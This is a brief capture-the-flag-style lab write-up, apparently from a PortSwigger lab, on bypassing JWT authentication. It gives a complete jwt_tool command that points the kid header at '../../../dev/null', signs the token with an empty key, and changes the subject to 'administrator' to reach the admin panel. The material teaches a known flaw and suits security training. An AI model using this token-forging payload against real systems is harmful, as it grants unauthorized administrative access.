# JWT authentication bypass via kid header path traversal

In this lab, we will use path traversal vulnerability on `kid` value, to use /dev/null as a signing key, which is always empty

![image.png](JWT%20authentication%20bypass%20via%20kid%20header%20path%20trav/image.png)

```xml
python3 jwt_tool.py eyJraWQiOiI0NjFlMmFiOC03ZGJlLTRiODgtODdhYy1jMTc0MWE1NGIyNGUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTQ5ODc1Nywic3ViIjoid2llbmVyIn0.frmeb7kg_VW8plct-V9TdzJljrA254d9xIUyiww6nmY -I -hc kid -hv '../../../dev/null' -pc sub -pv administrator -S hs256 -p ''
```

![image.png](JWT%20authentication%20bypass%20via%20kid%20header%20path%20trav/image%201.png)

Copy tampered token and use it to reach /admin dashboard

![image.png](JWT%20authentication%20bypass%20via%20kid%20header%20path%20trav/image%202.png)

![image.png](JWT%20authentication%20bypass%20via%20kid%20header%20path%20trav/image%203.png)

![image.png](JWT%20authentication%20bypass%20via%20kid%20header%20path%20trav/image%204.png)

![image.png](JWT%20authentication%20bypass%20via%20kid%20header%20path%20trav/image%205.png)